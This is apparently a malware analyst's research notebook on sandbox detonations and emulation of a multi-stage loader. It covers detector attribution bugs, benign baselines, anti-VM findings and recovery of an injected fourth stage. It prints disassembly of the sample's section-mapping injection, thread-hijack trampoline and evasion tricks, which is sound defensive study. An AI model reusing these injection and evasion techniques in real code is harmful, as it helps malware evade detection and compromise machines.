**And two unmapped `ntdll` copies sit in private memory** — `0x13b0000` and
`0x156f000`, both 1,830,912 bytes, both carrying ntdll's `0xd277d290`. That is
the self-unhooking visible in *memory structure*, independent of the Procmon
file-opens the ntdll pass keyed on. The dump also records
`host_image_timestamp 0x5ff2b99b`, the payload's rather than the file's, which
is precisely why the event-log check works.

**Five lines of evidence, four independent sources** — the event log, the module
list against disk, the memory layout, and Procmon — converging on one act. No
single one of them could see what the others saw.

The split-API YARA rule does **not** match this dump, and that is correct rather
than a miss: stage 2's managed literals live in the sample's own process, while
`RegSvcs` holds stage 3, which is native and carries no plaintext. A real
malware dump that lacks the rule's subject declining to fire is a small extra
negative control.

**Two operational notes worth keeping.** WER dumps land in `C:\werdumps`, which
survives losing `cases\` but **not** a revert — so it is the first thing to copy
off, not the last. And `attributed_to_sample` reads **false** on this dump even
though pid 9132's parent is the sample and `missed_descendants` says so: the
crash-dump collector is not consulting the lineage the rest of the run used.
That is the same attribution family as the two contamination bugs this run
exposed, and it is unfixed.

### Four attribution bugs in one day, and the sweep for the rest — 13 Aug

All four are one shape: **the lineage existed and the consumer was not using
it.** Worth naming as a class, because it is now the most productive bug type
this project has, and because three of the four were found by a single live run
rather than by reading code.

| bug | effect |
|---|---|
| `ntdll_unhooking` counted `WerFault.exe` | 30 of 41 opens credited to the sample were a crash reporter reading ntdll |
| `ntdll_unhooking` counted `procdump64.exe` | 18 of 60 background opens were the pipeline's own dumping tool, inflating its false-positive baseline |
| `CrashDumpCollector` attributed by name only | the only image of the hollowed process the run captured reported `attributed_to_sample: false` |
| `is_analyzer_image("fakenet.exe")` returned `False` | a marker written `akenet` could never match a bare process name |

The first three were live-run findings; the fourth came from sweeping for the
rest of the class afterwards.

**The crash-dump one had two bugs stacked**, which is why it read as one. The
PID never parsed — the code took index 1 of the dotted file name, correct for
`RegSvcs.10784.dmp` and wrong for `RegSvcs.exe.9132.dmp` where index 1 is
`"exe"`; WER writes both shapes and the comment described one. And attribution
was by image name against a set seeded from the sample's own name plus the
processes the memory watcher *observed* — so a child the watcher never saw,
which is exactly the short-lived hollowing target these dumps exist to capture,
could not be in it. It now takes `sample_pids` and attributes by PID first,
name second, the contract `summarize_crashes` already documented.

**What the sweep found clean**, recorded so it is not redone: every pass taking
`descendant_pids` honours the `None` / empty-set contract; `sysmon_collector`
passes full `Image` paths and was unaffected by the FakeNet gap; and
`findings.py` and `dropped_file_triage.py` carrying their own analyzer lists is
mostly *not* divergence — they match process names, path noise and
case-directory subpaths for three different purposes. The one apparent gap,
`utils` lacking `autoruns64.exe`, is theoretical: the pipeline ships
`autorunsc64.exe` and `autorunsc` matches it.

**What was deliberately not widened.** `\wireshark\` keeps its separators —
Wireshark is not this pipeline's tooling, so the marker catches an analyst's
installed copy by directory and a bare name would suppress a *sample* called
`wireshark.exe`. `python.exe` stays absent: the analyzer runs on Python, but so
does Cuckoo's agent and it is on this sample's own blocklist. Widening a
suppression list on speculation is how attribution gets replaced by a name list.

**The lesson for the next detector.** Every one of these shipped with lineage
available and unused, and every one produced a *plausible* number rather than an
obvious failure. When adding a pass, the question is not "does it attribute" but
"does it attribute with everything the run already knows" — and the answer
belongs in a test at the helper level, which is where it now is.

### Benign rates measured, scoring decided, gap 4 built — 13 Aug

**The dynamic side's build queue is empty.** What follows is the last of it.

**Both scored detectors now have measured benign rates, and neither needed the
VM.**

`scripts/benign_baseline.py` dumps ordinary processes on the host and runs the
carver and module integrity over them. **12 distinct programs, 491 MB, 300
modules: 0 unmapped, 0 replaced, 0 header_mismatch, 0 on the hollowing-target
branch** — with an `svchost.exe` in the corpus, so that branch was exercised
rather than merely unhit. Two selection bugs found by running it, both recorded
in the source: selecting on working set picks processes whose *reserved* address
space is huge (445 MB and 796 MB dumps; `vms` predicts dump size, `rss` does
not), and taking the N smallest gives six copies of `conhost.exe`, so "0 across
8 processes" was really 0 across three programs.

`scripts/benign_crash_baseline.py` answers the WER check, and **noticing the
question saves a VM run**: that check only evaluates processes that *crashed*,
so a benign detonation yields `checked: 0` and says nothing. The real question
is "given a benign crash, does the running image disagree with the file?", and
this host's Application Error log is already a benign crash corpus. **35 crashes
over 180 days: 1 mismatch (2.9%), 0 in a hollowing target.** The one mismatch is
`steamwebhelper.exe` running an image built 24 Jul against a file built 3 Aug —
**Steam updated itself while a helper process was still running**, which is the
exact failure mode predicted before looking and the reason `strong` requires a
hollowing target. A corpus of 35 crashes but only three distinct programs; the
load-bearing number is the zero.

**The scoring decision, and the constraint that made it.** The category doc
says a category must fire at most once however many events back it, "otherwise
a single chatty behaviour outvotes three quiet ones", and the carver was already
folded into `process_injection` for that reason. On run `d7cc5044` one act —
hollowing `RegSvcs.exe` — was visible to the crash route, the WER route, module
integrity *and* the ntdll pass. Scored separately, **one hollow would have
outvoted persistence, C2 and a dropped payload combined.**

| detector | decision |
|---|---|
| Module integrity `header_mismatch` | folded into `process_injection`; `strong` in a hollowing target. Benign rate measured, 0/300 |
| WER image timestamp | folded in; `strong` in a hollowing target. Benign 0/35 in a target |
| ntdll unhooking | **context-only, by decision** — one observation, benign rate needs a Procmon capture, and its claim is *defence evasion* rather than injection. Folding it in would score a different behaviour through the wrong category |

Both are gated on the pass reporting `available`, so a run that compared nothing
contributes nothing in either direction. A test asserts all five injection
routes firing still yields exactly one category.

**Gap 4's active detector exists** — `correlate_vm_check_with_silence` in
`vm_artifact_reads.py`. Four verdicts: `not_collected`, `no_vm_check`,
`checked_then_active`, `checked_then_quiet`. Only `vm_specific` reads count as
the check, because `identity_surface` is where a VM check looks *and* where an
inventory agent looks. Position is by capture order rather than clock —
Procmon's `Time of Day` has no date. A hit that cannot be located in the stream
reports `available: false` rather than "zero events after", because that degrade
would have read as a bail.

**Its threshold is not calibrated and says so** in the payload, the report card
and the tests. This was built against this document's own advice that it should
come last because it needs a live run to aim it; registry reads have been
configured for three runs and captured on one, and this sample has never
produced a read the pass could see. The mechanism is testable offline, the
constant is not, so the constant is labelled rather than dressed up.

**As of 13 Aug that framing is superseded, and the answer is not "wait for a
better run".** Two samples that provably detect virtualisation — FormBook by
module hash, `a6a86646…` by something at CPU or API level, announced with an
on-screen dialog — both produced `artifacts_read: 0`. The threshold's input is
structurally rarer than assumed, so **this detector should be recorded as
context-only by decision** rather than left indefinitely awaiting calibration.
See *Run `8f4ca91…`*.

### Run `bb51babb`, 13 Aug — registry reads collected at last, and the answer is no

The run the last three were supposed to be. `dynamic_registry_reads.pmc` was
actually loaded, all twelve `verify_run.py` rows passed, and **every
pre-registered prediction hit**. Two of them settled things that had been open
for weeks. The headline result is a negative, and it is a real one.

**147,295 registry reads in the stream, 73,825 by the sample's tree, and not one
of them names a VM artifact.** `hits: []`, `artifacts_read: 0`. Gap 4b's
collection path is closed — the thing that had never once had data now has
73,825 events of it — and the finding path still did not fire, because the
sample does not do this.

**That negative is trustworthy, because the run carries its own positive
control.** The collector matched VM artifacts elsewhere in the same stream and
binned them correctly:

- `powershell.exe` (5732, *the sample's own child*) read
  `HKLM\System\CurrentControlSet\services\VBoxSF\NetworkProvider\{name,Class,ProviderPath}`
  — six `vm_specific` reads, classified `routine_subpath`. Enumerating network
  providers walks every service and VirtualBox is one; it is not a VM check.
- `WerFault.exe` read `SystemManufacturer`, `BIOSVersion`, `SystemProductName`
  — 22 reads, classified `windows_response`.

So the matcher fires on real VBoxSF paths and on firmware identity, including
when a *descendant of the sample* touches them. Zero for the sample is a
measurement, not a blind spot. Note the shape of that: the strongest evidence
the detector works came from the reads it deliberately refused to count.

**The conclusion is about the sample, not the pipeline.** This variant's
anti-analysis surface is module-hash — `crc32("sbiedll.dll")` via the `PEB->Ldr`
walk — and the CRC-32 process-name blocklist. The registry was never how it
looks. **Gap 4b's finding path may not be reachable on this sample at all**, and
a fourth detonation aimed at it would buy nothing. If that path is ever to fire
against real data it needs a *different* sample, not another run of this one.

**Gap 4's detector therefore remains uncalibrated.** `verdict: no_vm_check`,
`threshold: 10`, `threshold_calibrated: false`. It could not be aimed because
there was no check to measure the quiet period after. The run bought one of its
two objectives; this document predicted both, and should not pretend otherwise.

**The dump watcher caught `RegSvcs`, which this document said to expect it not
to.** Two images at t35, 15 MB each — one `process-spawn`, one `process-exit`.
Not the 1s re-dump: `RegSvcs` exited before a re-dump came due, so the spawn and
exit triggers are what got it. The standing advice that "no scheduled offset can
catch a 3-second child" was true and incomplete — the *event-driven* triggers
are not scheduled offsets, and they do not care how short the life is.

**So hollowing was confirmed from a scheduled dump for the first time.**
`header_mismatch` on `regsvcs.exe @ 0x400000` appears in both t35 images as well
as the crash dump. Every previous confirmation depended on the WER route.

**Three of the six `header_mismatch` verdicts are probably false positives, and
they are all in the crash dump.** `RegSvcs.exe.6844.dmp` also flags `ntdll`,
`kernel32` and `kernelbase`. `kernel32` compares 4,096 bytes and finds 4,096
differing — one page; in the t35 scheduled dumps it compares 440,553 and is
`identical`. Memory absent from a triage minidump is being counted as memory
that differs. **`module_integrity` is a scored detector whose benign baseline —
0 mismatches, 300 modules, 12 programs — was measured over scheduled dumps of
ordinary software.** The crash-dump input path has no measured false-positive
rate, and this is the first run to point the detector at one with system DLLs
present. Do not quote "6 header mismatches" as if all six were findings.

Other rows, none surprising: WER image-timestamp `recorded 0x5ff2b99b` against
`on disk 0x68531ee1`, exactly as pre-registered; ntdll pass 3 opens by the
sample, 2 in a hollowing target, background rate 3 — the 60→2 contamination fix
holds on a second run; 11 of 12 dumps succeeded; the PE carver produced one
.NET image from the sample's own t25 dump and **nothing from either `RegSvcs`
image**, so this run did not recover stage 4 either.

**Only one `RegSvcs` this run**, against the 3× within 15 ms in the reference
data. The sample's +55s dump was skipped because the process exited with that
offset still pending.

**A stale file rode along in the export.** `C:\werdumps\RegSvcs.exe.12080.dmp`
is not from this run — `crash_dumps.json` collected only 6844, sysmon logged one
crash, and 12080 appears in no process list. `C:\werdumps` survives everything
but a revert, so it accumulates across runs. Harmless this time and easy to
misattribute later; check the pid against `observed_processes` before crediting
any dump in that folder to a run.

### Run `8f4ca91…`, 13 Aug — a VM bail the pass structurally cannot see

Sample `a6a86646b0066a630d7e6004ce08d52e70d81e77d98268b98a34b588cacded0a`,
picked specifically because it should exercise gap 4b. It did the opposite, and
the result is worth more than the calibration number would have been.

**This run has ground truth, which `bb51babb` did not.** The sample put a message
box on screen: *"This application cannot run inside a virtual machine or while
being debugged5"* — trailing `5` and all, which is a stray variable in its own
format string and a free signature, since a crypter does not rewrite payload
strings. So there is no doubt whatsoever that a VM check happened and that the
sample bailed on it. **And `vm_artifact_reads` reported `artifacts_read: 0`.**
That is a measured false negative against a known positive, not another sample
that happens not to check.

**Every telemetry-visible mechanism is ruled out**, each from pid 7956's own
events in `export.csv`:

| mechanism | evidence it was not used |
|---|---|
| registry VM keys | `artifacts_read: 0` across the sample's 1,761 reads |
| VM product/driver files | 0 of the capture's 78 VM-named events belong to the sample — all `Explorer.EXE` enumerating VBOX SCSI device classes and `svchost` touching `VBoxTray.exe` |
| device namespace (`\\.\VBoxGuest`) | **no device-namespace opens at all** |
| WMI | no `wbem*`, `fastprox` or `wmiutils` image loads (`Load Image` is in the config, so this is a real negative) |

What is left is CPUID, an RDTSC timing check, `GetSystemFirmwareTable`, or an
API-level process sweep — plausibly inside NSIS's `System.dll` plugin, which the
sample drops to `Temp\nsoC67D.tmp\System.dll` and which exists to call arbitrary
Win32 from install script. **None of that touches a file or a key, so no
Procmon-based detector can see it, and Sysmon would not either.**

**Note this run had no internal positive control**, unlike `bb51babb`:
`background_artifact_reads` is 0 too, so nothing in 124,967 reads independently
demonstrates the matcher would have fired. The two runs are complementary —
`bb51babb` had a control but no ground truth about the sample, this one has
ground truth but no control. Neither alone is conclusive; together they are.

#### What this does to gap 4

**Two consecutive samples that demonstrably detect virtualisation used
mechanisms the registry pass cannot observe** — FormBook by module hash over
`PEB->Ldr`, this one by something at CPU or API level. That is no longer a
statement about one sample. It is a **scope statement about the detector**: the
registry is one narrow surface of VM detection and the field does not favour it.

The practical consequence is that `vm_check_and_bail`'s threshold of 10 may not
be calibratable from field samples at any useful rate. **The honest ledger entry
is "stays context-only because its input is rarer than assumed", not "awaiting
calibration"** — which is one of the three outcomes `docs/ROADMAP.md` already
allows, and is a decision rather than a default. Do not keep booking detonations
hoping to aim it; two samples chosen *for* this behaviour both missed.

If it is ever to be aimed, the input has to be manufactured rather than found: a
sample known to read `\acpi\dsdt\vbox__`, confirmed by reading its code rather
than by a sandbox signature.

#### The crypter is worth more than the payload here

The sample is an **NSIS installer**, and its build style is loud:

- `HKCU\ufordjelighedens\fucoids` — **282 reads**, config or payload staged in
  the registry and read back in pieces
- `…\Start Menu\hydnocarpic` — **5,119 `PATH NOT FOUND` probes** into one
  directory that does not exist
- `C:\Program Files (x86)\streamere`,
  `Temp\studieskolen\tandstickor\microphotography`
- **5,403 of 6,234 `CreateFile` calls failed**

Random dictionary words for every path and key, with a Scandinavian lean
(`studieskolen`, `tandstickor`) that suggests one builder's wordlist. That
volume of failed probes into nonsense paths is a cheap, robust behavioural
signature — and unlike the anti-VM check itself, it is one this pipeline can
actually see. Clean bail otherwise: no crash, no injection, one process, 141
modules all `identical`.

### The poll loop is not seven identical sweeps — 13 Aug

This document has described the ending as "seven enumerations,
`NtDelayExecution` between them, then `ExitProcess`", as though one action
repeated. **Some passes consult the process-name blocklist and some do not**,
measured with `trace_blocklist.py --which N`:

| pass | armed at | a served name's hash reached EAX? |
|---|---|---|
| #1 | — | **yes** |
| #4 | 500,413,069 | **yes** |
| #5 | 531,625,464 | no |
| #6 | 565,844,270 | **yes** |
| #7 | 597,056,665 | no |

The control rules out the instrument: on #1 the hook fires cleanly and shows the
table-driven CRC-32 at `0x02017301`–`0x02017325` (`xor eax, [ebp+edx*4-0x404]`
against the table, `not eax` for the final NOT). The quiet passes are quiet
about the *blocklist*, not about the hook.

**A first version of this section also claimed two distinct pass lengths, 2.3M
blocks and 9.4M, and that was an artefact of the instrument.**
`trace_blocklist.py` calls `emu_stop()` a few hundred instructions after it
captures a hit, so a pass that hashes *appears* short because the tool stopped
itself; a pass that never hashes runs on. Re-measured without the early stop,
**#6 runs 9,449,663 blocks and #7 runs 9,439,946 — the same length within
0.1%.** The passes take the same time and differ in what they do with it. This
is the third time in this file that a block count has turned out to describe the
harness rather than the sample; the tell each time was a number that repeated
too exactly.

**Why it matters: the last thing before `ExitProcess` is a pass that never
consults the blocklist.** The exit is therefore not "I swept the process list
and found no analysis tool" — by then it has stopped looking at names
altogether. Whatever decides to leave lives in the other pass, and nothing has
ever looked at it. That also demotes the uncracked names: they are consumed by
the pass that *isn't* making the decision.

**What the two passes actually differ by**, from `trace_poll_pass.py` recording
executed addresses inside the allocation: #6 touches 1,084 distinct addresses
and #7 touches 943, with **187 unique to #6 and 46 unique to #7**. The 187
decode as exactly what they should — the CRC-32 table builder and loop at
`0x02017251` (58,976 executions), the blocklist compare at `0x02026181` that
`hash_call_sites.py` already names, and a case-folder at `0x0202fd21`
(`cmp al, 0x41` / `cmp al, 0x5a`).

**Reading the 46 unique to the quiet pass failed twice first**, both times in
ways this file already documents. A linear capstone sweep from the allocation
base desynchronises and renders them `iretd` / `fmul` / `?`. Decoding at each
executed address instead *still* gave nonsense, because **the allocation keeps
decrypting as it runs** and the bytes were being read from a fresh restore at
348M blocks while the code executed at 597M. `trace_poll_pass.py` now stores the
allocation captured at trace time alongside the counts, which is the only moment
at which that disassembly can be correct.

#### The quiet pass is a second enumeration, and it compares numbers not names

With the disassembly fixed, the 46 addresses read as one loop:

    0x020153db  call 0x2014271              ; iterator INIT  (cursor, record)
    0x02015400  call 0x202f471              ; prepare a 0x104 = MAX_PATH buffer
    0x02015413  call 0x202fa81              ; record name -> local buffer
    0x02015431  test eax, eax               ; inner loop head
    0x02015435  cmp  eax, [ebp+esi*4-0x44]  ; a record dword vs a stack ARRAY
    0x02015457  jb   0x2015431              ; ...bounded by edi
    0x02015469  cmp  ebx, 0xc               ; twelve
    0x0201546c  jae  0x2015489              ; stop at twelve
    0x02015479  call 0x20142b1              ; iterator NEXT
    0x02015483  jne  0x20153f1              ; loop while NEXT succeeds

**`cmp ebx, 0xc` is twelve, and `PROCESS_LIST` has exactly twelve entries.** So
both passes walk the same served list to the same bound. The difference is what
they do with each record: the hashing pass CRC-32s the *name* against 20
constants, and this one converts the name into a MAX_PATH buffer, discards it,
and compares a **dword** field at `[ebp-0x3c4]` against an accumulated array at
`[ebp+esi*4-0x44]`.

**A reading, not yet a measurement:** a numeric process-record field checked
against a carried list is the shape of PID or parent-PID tracking across polls —
asking whether something expected has appeared, or whether something seen before
is still alive. That would explain the ending's structure, and it would explain
why the emulator can never get past it: `system_process_information` serves a
**static** list, byte-identical on every call, so nothing can ever appear or
disappear however many times the sample looks.

If that holds, the fix to try is a process list that *changes between calls*,
which no version of this harness has ever served. Confirm the field first:

    ..\.venv\Scripts\python.exe trace_poll_pass.py --which 7 --dump-at 0x2015435

which stops inside the pass and reports `eax` against the array at `[ebp-0x44]`,
`edi` long. **Do not skip that step and go straight to editing `PROCESS_LIST`** —
the four conclusions this document has already withdrawn were all inferences
from structure that a measurement would have caught.

**One honest limit.** #2 and #3 are unmeasured, so the pattern across all seven
is inference from four points.

`scripts/trace_poll_pass.py` is the follow-up instrument: it records which
addresses inside the allocation execute during one enumeration, so a hashing
pass and a quiet one can be diffed and the quiet pass's own code read off.

    ..\.venv\Scripts\python.exe trace_poll_pass.py --which 6 --out pass6.json
    ..\.venv\Scripts\python.exe trace_poll_pass.py --which 7 --out pass7.json
    ..\.venv\Scripts\python.exe trace_poll_pass.py --diff pass6.json pass7.json

### Serving one child of explorer reached the injection — 13 Aug

Acting on the poll-loop measurement got the emulator somewhere no run has been.
`RINGFORGE_EXPLORER_CHILD=1` adds `notepad.exe` (pid 5120, parent 4180) to the
served list, and stage 3 stops giving up:

    [108] 537M  NtOpenProcess                              = 0x0   <- handle granted
    [109] 542M  NtCreateSection(... 0x40 RWX, SEC_COMMIT)  = 0x0
    [110] 547M  NtMapViewOfSection(0x410, 0xffffffff, ...)         <- into ITSELF
    [111] 549M  NtMapViewOfSection(0x410, 0x40c, ...)              <- into the TARGET
          ...   151M blocks with nothing logged
    [112] 700M  NtClose(0x410)
    [113] 708M  NtOpenThread / [114] NtSuspendThread
    [115] 719M  NtGetContextThread / [116] NtSetContextThread
    [117] 731M  NtResumeThread
    [118+]      NtDelayExecution, and it keeps running rather than exiting

The baseline exits cleanly at 629M blocks. **The standing record that "no
injection was reached" and "no process was opened" is superseded** — both were
consequences of the harness serving a static process list, not of the sample.

#### `NtWriteVirtualMemory` is not on this sample's path and never was

`emulate_native_stub.py` calls it *"the one that matters. Everything above
exists to reach it."* That is wrong here. This is **section-mapping injection**:
one RWX section mapped into both processes, the payload copied into the local
view with ordinary instructions, then the target's thread redirected. Nothing
crosses the process boundary through a syscall — which is the entire point of
the technique, and it defeats exactly the hook this harness was built around.
The 151M-block silence between `[111]` and `[112]` is the copy.

#### The section size is randomised on purpose, and that retracts a theory

The view is 24,820,736 bytes filled with **uniform keystream** — entropy 8.000
in every megabyte, 99.61% non-zero which is 255/256 exactly, no PE, no strings.
Against a known 57,344-byte payload that looked like a broken emulation, and
this document briefly carried that reading. It is wrong. Traced back three
frames, the size comes from:

    0x02019695  push 0x7d00000        ; max = 131,072,000
    0x0201969a  push 0x1f4000         ; min =   2,048,000
    0x0201969f  call 0x2017ae1        ; a bounded draw, page-aligned up
    0x020196cf  mov  eax, [edi+0x250] ; a base size
    0x020196d8  add  eax, esi         ; base + random padding

**A random allocation between 2 MB and 131 MB, page-aligned**, which is why
`24,296,448` factors as `4096 × 5931`, plus a fixed `0x80000` of headroom the
type-6 wrapper at `0x0201bc5c` adds. So the implausible size *is* the
anti-analysis: nothing can signature this injection on allocation size, and a
24 MB keystream fill makes the dump expensive and featureless. **What looked
like evidence of divergence was the evasion working.**

#### The view is 1.1% content, and the content has been located

`[edi+0x250]`, the base the random padding is added to, reads **273,408 bytes**
(`0x42c00`) — measured at `0x020196d8`, where `eax` holds the base and `esi` the
draw. So:

| | |
|---|---|
| content | 273,408 |
| random padding | 24,023,040 |
| wrapper headroom | 524,288 (`0x80000`) |
| section | 24,820,736 |

**An allocation of exactly `0x42c00` exists at `0x27e7000`**, holding 273,408
bytes at entropy 7.973 that match nothing on the artifact drive — a new stage.
The size coincidence was suggestive and *not* sufficient: those bytes appear
nowhere in the section view, at any offset, head or tail. What settles it is
`trace_section_size.py --reads-of`:

    7,055,025 read(s) of that buffer; one span, +0x0 to 273,408 -- nothing skipped

    0x0202f454   273,408x  700,695,844-700,969,251blk  -- INSIDE the copy window
    0x0200af0c 6,600,572x  433,267,476-739,530,436blk  -- overlaps
    0x0202ee68   181,042x  431,084,891-431,446,974blk  -- outside

`0x0202f454` reads the buffer **exactly once per byte**, in a single linear pass
that ends **645 blocks before `NtClose` on the section handle**. That is the
copy, and it identifies `0x27e7000` as the injection source.

**Most of the 151M-block silence is camouflage, not payload.** The copy is the
last ~274K blocks of the window — about 0.2% of it, one block per byte, a tight
loop. Everything before it is the keystream fill.

    431M  prepare      0x0202ee68 reads the buffer 181k times
    539M  size         random draw + 273,408 base
    542M  create       NtCreateSection RWX 24.8 MB
    547M  map local    /  549M  map into the target
    549M-700.7M        keystream fill (the camouflage)
    700.70-700.97M     the copy: 273,408 bytes
    700,969,896        NtClose on the section
    708M-731M          OpenThread, Suspend, Get/SetContext, Resume

**Stage 4 is still not in plaintext**, but it is no longer an open question — it
is a located, sized, sourced artifact. The buffer goes into the view
*transformed*: its bytes are not there verbatim and the view holds no PE
anywhere, so the decryption belongs to the redirected thread, and that thread
never runs here — `NtGetContextThread` and `NtSetContextThread` are answered
`0x1` and do nothing.

**Next, and it needs no long run:** watch writes to the view across
`700,695,844`–`700,969,251` for the destination offset, then XOR source against
destination to recover the transform directly.

**`alloc_27e7000.bin` belongs on the artifact drive.** It is a new 273 KB stage
and it currently exists only in a session scratchpad, which is temporary.
`alloc_at540M.bin` — the allocation captured at 540M blocks — is worth keeping
beside it, because disassembly of this sample must come from the right vintage
and that file saves a fifteen-minute run per question.

#### Instrument bugs, because three in one day is a pattern

Each produced a plausible answer, which is what makes them dangerous:

- `trace_blocklist.py` calls `emu_stop()` after a hit, so a pass that hashes
  *looks* 2.3M blocks long. All passes are ~9.4M. See the retraction above.
- **The allocation keeps decrypting.** Disassembly must come from memory
  captured at the moment traced. An end-of-run dump renders live code as
  `iretd`/`fmul`/`?`, and at `0x020196e1` no alignment decodes it at all.
  `trace_poll_pass.py` and `trace_section_size.py --dump-alloc` both store the
  allocation beside their output for this reason.
- `resume(count=...)` is an **instruction** budget; `emu.blocks` counts basic
  blocks, about four to one. Passing a block difference as a count stopped a
  trace 143M blocks short and reported `0 writes to that range`, which reads
  like a finding rather than a truncated run.

### The far side runs — 14 Aug

The transform turned out to be a dead end, and that is what forced the better
route. Source and destination are both ciphertext and their XOR is entropy
**7.999 with no period at any tested length** — there is nothing to solve for
offline. Whatever decrypts the payload runs in the thread the loader redirected,
so the answer was to **run that thread** rather than reverse its input.

#### What made it cheap

Two calls had been going unhandled, which set `nargs` to 0 and left their
arguments on the stack for the caller's own `ret` to return into. Implementing
`NtGetContextThread` / `NtSetContextThread` with the right arity is the fix;
capturing the record is the point, because **the `CONTEXT` a hollowing loader
writes is the only thing that says where the injected code starts**:

    [725,274,879blk] NtSetContextThread eip=0x3e9f89b eax=0x2fcf0c esp=0x2fcd6c

`0x3e9f89b` sits inside the payload at offset **`0xbc27`**. The loader sets
`Eip` directly rather than the `Eax`/`RtlUserThreadStart` convention —
`decode_context` reads both, because guessing wrong looks exactly like resuming
into nothing.

**And `esp` was wrong — that is retracted.** This section first read: *"`esp` is
`0x2fcd6c`, already inside the mapped stack, so the fabricated remote stack the
plan allowed for was never needed."* The opposite is true. `NtGetContextThread`
was answering with the **live machine's** registers, so the record handed back
carried the *loader's own* `Esp`; the loader copied it into what it passed to
`NtSetContextThread`, and the injected thread then ran on the loader's stack and
flattened it with ten million pushes. Resuming the loader afterwards died at
`eip 0x2fcd68`, executing its own wreckage. The plan's instinct — fabricate a
remote stack — was right, and a real mapped address looking like good news is
what talked this document out of it. `REMOTE_STACK` at `0x10000000` now serves
one, and `ContextFlags` is `CONTEXT_FULL` rather than the `0x0` noted below.

**What survives the retraction is the entry point.** Regenerated with the fix,
`NtSetContextThread` still reports `eip=0x3e9f89b` while `esp` passes through as
`0x10080000` — so the loader does a read-modify-write and sets **only `Eip`**.
The entry is genuinely its choice; the stack was always ours.

`--snapshot-after-inject` writes **`after_inject.state`** at the first
`NtResumeThread`. Everything from here starts there, in seconds, instead of
paying ~380M blocks from `after_scan.state`. Snapshots are v3 and carry
`thread_contexts`; v1 and v2 stay readable.

#### The entry is a thread-hijack trampoline

    0x03e9f89b  push  0x7707aa80   ; where the thread was suspended, in ntdll
    0x03e9f8a0  pushal             ; save the victim thread's registers
    0x03e9f8a1  call  0x3e9f0c4    ; run the payload
    0x03e9f8a6  popal
    0x03e9f8a7  ret                ; let the thread carry on as if nothing happened

Which explains the choice of `NtSetContextThread` over creating a thread: it
**borrows an existing thread and gives it back**, leaving no new-thread artifact.

#### And what it calls first is a deliberate stall

    0x03e9f6a3  cmp  ecx, [ebp-0x168]   ; i > 512,371,392 ?
    0x03e9f6b1  imul edx, [ebp-0xd4]    ; acc *= k -- computes nothing useful
    0x03e9f6b8  mov  [ebp-0x13c], edx

**512,371,392 iterations, about 3.07 billion instructions.** Nothing was broken
and nothing diverged; it had not finished. `--survey` is what turned that from a
mystery into a diagnosis in a single run — watching the payload alone reported
*1 byte written*, which reads identically as a failed resume, a diverged
emulation, or a stub decrypting elsewhere. Adding where writes land (9,988,297
into the stack) and which code is hot (**one** 4 KB page, 10,016,624 blocks)
named it at once.

**Do not patch `[ebp-0x168]` to shorten it.** The body accumulates into
`[ebp-0x13c]`, and a delay loop whose result is later used as a key or a check
is the standard way to punish that shortcut: a short-circuited run yields a
wrong accumulator and a plausible-looking wrong answer. Three billion
instructions of honest emulation is cheaper than that.

#### The stall cannot end here, and no budget would have helped

That run finished, and the answer was a fourth outcome this document did not
list: **the loop is unterminating by construction.** Eight billion instructions
produced the same one hot page, and the reason is not the budget:

    0x3e9f575  movzx eax, byte ptr [ebp-0x119]   ; the flag, 0x1d
    0x3e9f57e  je    0x3e9f6c5                   ; leaves only when it is zero
    ...
    0x3e9f65c  edx = flag                         ; 0x1d
    0x3e9f663  eax = [ebp-0xa8]                   ; 0x3e9f8a8, hardcoded
    0x3e9f669  ecx = byte [eax]                   ; currently 0xb1
    0x3e9f66c  cmp edx, ecx                       ; equal?
    0x3e9f670    flag = 0 ; jmp exit              ; only then
    0x3e9f679  edx = [ebp-0x170]                  ; = ptr + 5
    0x3e9f67f  byte [edx] = 0x56                  ; the only write it makes

The exit needs `*0x3e9f8a8 == 0x1d`. The loop's single write goes to **`ptr+5`**,
never to `ptr`. Nothing it does can satisfy its own condition, so it spins for
as long as it is given — the payload byte count went 1, then 2, and would go on
counting outer passes forever.

**`0x3e9f8a8` is a data cell, not code.** It sits immediately after the
trampoline's `ret` — payload `+0xbc34` — and the pointer to it is a hardcoded
absolute (`mov dword [ebp-0xa8], 0x3e9f8a8` at `0x3e9f4be`), which is only
sensible because the loader relocated the payload to where it mapped it. So the
payload is a manually mapped, relocated image with a small handshake area
attached to its entry stub: `ptr[0]` is what the stub waits on, `ptr[5]` is what
it answers with.

**The live hypothesis is a two-party handshake over the shared section**, the
loader being the other party — it is still alive in its own thread issuing 36
`NtDelayExecution` calls, and both processes map the same section. It fits what
has been observed: run only the loader and `ptr+5` stays ciphertext, so it never
sees `0x56`; run only the stub and `ptr` stays ciphertext, so it never sees
`0x1d`. Each waits for the other, and both were observed doing exactly that.

`scripts/handshake_probe.py` tests it by interleaving — run the stub to its
write, restore the loader's registers, let it continue, and watch the cell.
**Untested as of writing.** The first attempt was void: the stub was still
running on the loader's stack (see the retraction above), so the loader died at
138K blocks and the probe reported *"the loader never touches it"* from a
corpse. The probe now refuses a verdict unless the loader ran to completion.

Note the limit of the design even when it works: two phases is one exchange, not
concurrency. If the real protocol needs several rounds, a single interleave will
not show it.

### Stage 4 is recovered — 16 Aug

**`stage4_mapped_b454edc7.xor9`**, 273,408 bytes, decrypted, on the artifact
drive beside `injected_source_98cc576c.xor9` which is the same stage as the
loader stores it. The pair makes the transform demonstrable rather than
theoretical.

#### It has no PE header, and looking for one is what delayed finding it

There is no `MZ`/`PE` pair in the stage, or anywhere in the 24.8 MB section
around it. Every scan came back empty and every write-up read that as *still
encrypted* — including this file's. **It is a manually mapped image**, which is
exactly what a loader that does its own relocation produces, and it was never
going to carry headers.

The evidence that it is code had been in the survey output for hours: **32 hot
pages, 27 million blocks executing out of `0x3ea8000` alone.** Those pages
disassemble cleanly — 117/117 and 363/363 instructions over a kilobyte, ordinary
prologues, calls and frames. Code cannot execute from ciphertext. The 7.705
entropy is plaintext code surrounded by data that stays packed, which is what a
mapped stage looks like in aggregate.

It addresses its context struct at **`[esi+0x6d8]`** — the same offset stage 3
uses at `0x1605f`. Same framework, same author.

#### The blockers were three, and two were ours

1. **A static process list.** Stage 3 waits for a process whose parent is
   `explorer.exe`; the harness served a list that never changed, so the wait
   could not end. `RINGFORGE_EXPLORER_CHILD=1`.
2. **A handshake needing two parties.** The stub waits on a byte in the shared
   section and the loader answers it. Neither can proceed alone, and both were
   observed failing that way for days. **The 512-million-iteration loop was a
   timeout around a wait, not a stall to outwait** — 4 billion instructions,
   then 8 billion, then a 24-hour run all bought nothing. `handshake_probe.py`
   interleaves them and the loader writes `0x1d`.
